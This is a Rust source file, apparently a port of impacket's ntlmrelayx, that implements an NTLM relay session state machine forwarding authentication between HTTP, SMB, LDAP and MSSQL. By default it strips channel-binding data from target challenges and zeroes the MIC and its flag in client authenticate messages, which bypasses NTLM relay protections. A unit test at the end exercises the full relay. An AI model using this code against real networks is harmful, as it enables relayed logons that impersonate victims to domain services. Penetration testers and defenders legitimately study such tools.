//! `session`: Core NTLMSSP cross-protocol relay state machine (`impacket/examples/ntlmrelayx`).
//!
//! Drives the 3-step NTLM authentication relay lifecycle across protocols:
//! 1. Client `NegotiateMessage` (Type 1) -> forwarded to Target.
//! 2. Target `ChallengeMessage` (Type 2) -> EPA / Channel Binding stripped -> forwarded to Client.
//! 3. Client `AuthenticateMessage` (Type 3) -> MIC flag stripped -> forwarded to Target to complete logon.

use impacket_core::CoreError;

/// Protocols supported by the relay engine.
#[derive(Debug, Copy, Clone, PartialEq, Eq)]
pub enum RelayProtocol {
    Http,
    Smb,
    Ldap,
    Mssql,
}

impl RelayProtocol {
    pub const fn name(self) -> &'static str {
        match self {
            Self::Http => "HTTP",
            Self::Smb => "SMB",
            Self::Ldap => "LDAP",
            Self::Mssql => "MSSQL",
        }
    }
}

/// State of an active NTLM relay session.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RelayState {
    Initial,
    ChallengePending,
    AuthenticatePending,
    Completed,
    Failed(String),
}

/// Active cross-protocol NTLM relay session.
#[derive(Debug, Clone)]
pub struct NtlmRelaySession {
    pub client_protocol: RelayProtocol,
    pub target_protocol: RelayProtocol,
    pub state: RelayState,
    pub negotiate_token: Option<Vec<u8>>,
    pub challenge_token: Option<Vec<u8>>,
    pub authenticate_token: Option<Vec<u8>>,
    pub strip_mic: bool,
    pub strip_channel_bindings: bool,
}

impl NtlmRelaySession {
    pub fn new(client_protocol: RelayProtocol, target_protocol: RelayProtocol) -> Self {
        Self {
            client_protocol,
            target_protocol,
            state: RelayState::Initial,
            negotiate_token: None,
            challenge_token: None,
            authenticate_token: None,
            strip_mic: true,
            strip_channel_bindings: true,
        }
    }

    /// Processes an incoming NTLMSSP Type 1 `NegotiateMessage` from the client.
    /// Validates header and returns the token to be sent to the target server.
    pub fn process_client_negotiate(&mut self, token: &[u8]) -> Result<Vec<u8>, CoreError> {
        if self.state != RelayState::Initial {
            return Err(CoreError::ProtocolError(format!(
                "Invalid relay state for Type 1: {:?}",
                self.state
            )));
        }

        if token.len() < 12 || &token[0..8] != b"NTLMSSP\x00" {
            return Err(CoreError::ProtocolError("Invalid NTLMSSP Type 1 header".into()));
        }
        let msg_type = u32::from_le_bytes(token[8..12].try_into().unwrap());
        if msg_type != 1 {
            return Err(CoreError::ProtocolError(format!(
                "Expected NTLMSSP message type 1, got {}",
                msg_type
            )));
        }

        self.negotiate_token = Some(token.to_vec());
        self.state = RelayState::ChallengePending;
        Ok(token.to_vec())
    }

    /// Processes an incoming NTLMSSP Type 2 `ChallengeMessage` from the target.
    /// Optionally strips `MsvAvChannelBindings` (type 10) from TargetInfo and returns
    /// the token to forward to the client.
    pub fn process_target_challenge(&mut self, token: &[u8]) -> Result<Vec<u8>, CoreError> {
        if self.state != RelayState::ChallengePending {
            return Err(CoreError::ProtocolError(format!(
                "Invalid relay state for Type 2: {:?}",
                self.state
            )));
        }

        if token.len() < 32 || &token[0..8] != b"NTLMSSP\x00" {
            return Err(CoreError::ProtocolError("Invalid NTLMSSP Type 2 header".into()));
        }
        let msg_type = u32::from_le_bytes(token[8..12].try_into().unwrap());
        if msg_type != 2 {
            return Err(CoreError::ProtocolError(format!(
                "Expected NTLMSSP message type 2, got {}",
                msg_type
            )));
        }

        let out_token = if self.strip_channel_bindings {
            strip_channel_bindings_from_challenge(token)?
        } else {
            token.to_vec()
        };

        self.challenge_token = Some(out_token.clone());
        self.state = RelayState::AuthenticatePending;
        Ok(out_token)
    }

    /// Processes an incoming NTLMSSP Type 3 `AuthenticateMessage` from the client.
    /// Optionally strips the Message Integrity Code (MIC) and clears the MIC flag in `MsvAvFlags`
    /// before forwarding to the target server.
    pub fn process_client_authenticate(&mut self, token: &[u8]) -> Result<Vec<u8>, CoreError> {
        if self.state != RelayState::AuthenticatePending {
            return Err(CoreError::ProtocolError(format!(
                "Invalid relay state for Type 3: {:?}",
                self.state
            )));
        }

        if token.len() < 64 || &token[0..8] != b"NTLMSSP\x00" {
            return Err(CoreError::ProtocolError("Invalid NTLMSSP Type 3 header".into()));
        }
        let msg_type = u32::from_le_bytes(token[8..12].try_into().unwrap());
        if msg_type != 3 {
            return Err(CoreError::ProtocolError(format!(
                "Expected NTLMSSP message type 3, got {}",
                msg_type
            )));
        }

        let mut out_token = token.to_vec();
        if self.strip_mic {
            strip_mic_from_authenticate(&mut out_token)?;
        }

        self.authenticate_token = Some(out_token.clone());
        self.state = RelayState::Completed;
        Ok(out_token)
    }
}

/// Strips the MIC field and clears bit 0x02 in `MsvAvFlags` from an NTLMSSP Type 3 message.
pub fn strip_mic_from_authenticate(data: &mut [u8]) -> Result<(), CoreError> {
    if data.len() < 72 {
        return Ok(());
    }

    // Zero out MIC at offset 72..88 if buffer is large enough
    if data.len() >= 88 {
        for b in &mut data[72..88] {
            *b = 0;
        }
    }

    // Locate NT Challenge Response to find AV_PAIRs
    let nt_len = u16::from_le_bytes(data[20..22].try_into().unwrap()) as usize;
    let nt_offset = u32::from_le_bytes(data[24..28].try_into().unwrap()) as usize;

    if nt_offset + nt_len > data.len() || nt_len < 44 {
        return Ok(());
    }

    // Inside NTLMv2_RESPONSE: skip 16-byte response and 28-byte NTLMv2_CLIENT_CHALLENGE header
    let av_start = nt_offset + 16 + 28;
    let av_end = nt_offset + nt_len;

    let mut pos = av_start;
    while pos + 4 <= av_end {
        let av_id = u16::from_le_bytes(data[pos..pos + 2].try_into().unwrap());
        let av_len = u16::from_le_bytes(data[pos + 2..pos + 4].try_into().unwrap()) as usize;
        pos += 4;

        if av_id == 0 {
            // MsvAvEOL
            break;
        }

        if av_id == 6 && av_len >= 4 && pos + 4 <= av_end {
            // MsvAvFlags: clear bit 0x02 (MIC provided)
            let mut flags = u32::from_le_bytes(data[pos..pos + 4].try_into().unwrap());
            flags &= !0x0000_0002;
            data[pos..pos + 4].copy_from_slice(&flags.to_le_bytes());
        }

        pos += av_len;
    }

    Ok(())
}

/// Strips `MsvAvChannelBindings` (AV ID 10) from TargetInfo in an NTLMSSP Type 2 message.
pub fn strip_channel_bindings_from_challenge(data: &[u8]) -> Result<Vec<u8>, CoreError> {
    if data.len() < 48 {
        return Ok(data.to_vec());
    }

    let target_info_len = u16::from_le_bytes(data[40..42].try_into().unwrap()) as usize;
    let target_info_offset = u32::from_le_bytes(data[44..48].try_into().unwrap()) as usize;

    if target_info_len == 0 || target_info_offset + target_info_len > data.len() {
        return Ok(data.to_vec());
    }

    let av_bytes = &data[target_info_offset..target_info_offset + target_info_len];
    let mut new_av_pairs = Vec::new();

    let mut pos = 0;
    while pos + 4 <= av_bytes.len() {
        let av_id = u16::from_le_bytes(av_bytes[pos..pos + 2].try_into().unwrap());
        let av_len = u16::from_le_bytes(av_bytes[pos + 2..pos + 4].try_into().unwrap()) as usize;

        if pos + 4 + av_len > av_bytes.len() {
            break;
        }

        // Omit MsvAvChannelBindings (ID 10)
        if av_id != 10 {
            new_av_pairs.extend_from_slice(&av_bytes[pos..pos + 4 + av_len]);
        }

        if av_id == 0 {
            break;
        }
        pos += 4 + av_len;
    }

    // Rebuild Type 2 message with updated TargetInfo length and payload
    let mut out = data.to_vec();
    let new_len = new_av_pairs.len() as u16;
    out[40..42].copy_from_slice(&new_len.to_le_bytes());
    out[42..44].copy_from_slice(&new_len.to_le_bytes());

    let payload_end = target_info_offset + target_info_len;
    let mut rebuilt = Vec::with_capacity(target_info_offset + new_av_pairs.len() + (data.len() - payload_end));
    rebuilt.extend_from_slice(&out[..target_info_offset]);
    rebuilt.extend_from_slice(&new_av_pairs);
    if payload_end < data.len() {
        rebuilt.extend_from_slice(&data[payload_end..]);
    }

    Ok(rebuilt)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_relay_session_lifecycle() {
        let mut session = NtlmRelaySession::new(RelayProtocol::Http, RelayProtocol::Smb);
        assert_eq!(session.state, RelayState::Initial);

        // 1. Client sends Type 1
        let mut type1 = Vec::new();
        type1.extend_from_slice(b"NTLMSSP\x00");
        type1.extend_from_slice(&1u32.to_le_bytes());
        type1.extend_from_slice(&0x0008_8207u32.to_le_bytes()); // flags
        let fwd1 = session.process_client_negotiate(&type1).unwrap();
        assert_eq!(fwd1, type1);
        assert_eq!(session.state, RelayState::ChallengePending);

        // 2. Target sends Type 2 with ChannelBindings (ID 10)
        let mut type2 = Vec::new();
        type2.extend_from_slice(b"NTLMSSP\x00");
        type2.extend_from_slice(&2u32.to_le_bytes());
        type2.extend_from_slice(&[0u8; 8]); // TargetName fields
        type2.extend_from_slice(&0x0080_0000u32.to_le_bytes()); // flags
        type2.extend_from_slice(&[0x11u8; 8]); // Challenge
        type2.extend_from_slice(&[0u8; 8]); // Reserved
        // TargetInfo fields (Len=12, MaxLen=12, Offset=48)
        type2.extend_from_slice(&12u16.to_le_bytes());
        type2.extend_from_slice(&12u16.to_le_bytes());
        type2.extend_from_slice(&48u32.to_le_bytes());

        // TargetInfo with AV_CHANNEL_BINDINGS (10) and EOL (0)
        type2.extend_from_slice(&10u16.to_le_bytes()); // ID 10
        type2.extend_from_slice(&4u16.to_le_bytes());  // Len 4
        type2.extend_from_slice(&[0xAA; 4]);           // Value
        type2.extend_from_slice(&0u16.to_le_bytes());  // EOL ID 0
        type2.extend_from_slice(&0u16.to_le_bytes());  // EOL Len 0

        let fwd2 = session.process_target_challenge(&type2).unwrap();
        assert_eq!(session.state, RelayState::AuthenticatePending);
        // Channel bindings (10) should have been stripped
        let new_ti_len = u16::from_le_bytes(fwd2[40..42].try_into().unwrap());
        assert_eq!(new_ti_len, 4); // Only EOL remains

        // 3. Client sends Type 3 with MIC and MsvAvFlags = 0x02
        let mut type3 = vec![0u8; 160];
        type3[0..8].copy_from_slice(b"NTLMSSP\x00");
        type3[8..12].copy_from_slice(&3u32.to_le_bytes());
        // Set NtResponse at offset 88 with length 60
        type3[20..22].copy_from_slice(&60u16.to_le_bytes());
        type3[22..24].copy_from_slice(&60u16.to_le_bytes());
        type3[24..28].copy_from_slice(&88u32.to_le_bytes());

        // Fill dummy MIC at 72..88
        for i in 72..88 {
            type3[i] = 0x99;
        }

        // MsvAvFlags at 88 + 16 + 28 = 132
        type3[132..134].copy_from_slice(&6u16.to_le_bytes()); // ID 6
        type3[134..136].copy_from_slice(&4u16.to_le_bytes()); // Len 4
        type3[136..140].copy_from_slice(&2u32.to_le_bytes()); // Flag 0x02 (MIC provided)
        type3[140..142].copy_from_slice(&0u16.to_le_bytes()); // EOL
        type3[142..144].copy_from_slice(&0u16.to_le_bytes());

        let fwd3 = session.process_client_authenticate(&type3).unwrap();
        assert_eq!(session.state, RelayState::Completed);

        // MIC should be zeroed
        assert_eq!(&fwd3[72..88], &[0u8; 16]);
        // Flag 0x02 should be cleared
        let flags_val = u32::from_le_bytes(fwd3[136..140].try_into().unwrap());
        assert_eq!(flags_val & 0x02, 0);
    }
}
